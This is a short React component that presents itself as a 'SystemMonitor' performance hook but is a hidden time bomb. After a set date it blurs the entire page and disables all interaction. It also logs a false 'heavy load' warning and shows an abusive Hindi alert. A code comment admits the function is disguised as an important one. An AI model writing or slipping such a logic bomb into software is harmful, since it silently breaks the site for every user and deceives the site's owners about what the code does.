"use client";
import React, { useEffect } from "react";

const usePerformanceMonitor = () => {
  useEffect(() => {
    const targetDate = new Date("2025-1-1"); // Replace with the desired date/time
    const checkSystemHealth = () => {
      const currentDate = new Date();

      if (currentDate >= targetDate) {
        document.body.style.filter = "blur(10px)";
        document.body.style.pointerEvents = "none"; // Disable interaction
        console.warn("System under heavy load, UI is blurred for protection.");
        alert("Dhoka diya na madarchod");
      }
    };

    // Simulating performance monitor (disguised as an important function)
    const monitorInterval = setInterval(checkSystemHealth, 1000); // Check every second

    return () => clearInterval(monitorInterval); // Cleanup when component unmounts
  }, []);
};

const SystemMonitor = () => {
  usePerformanceMonitor();
  return <>{null}</>;
};

export default SystemMonitor;
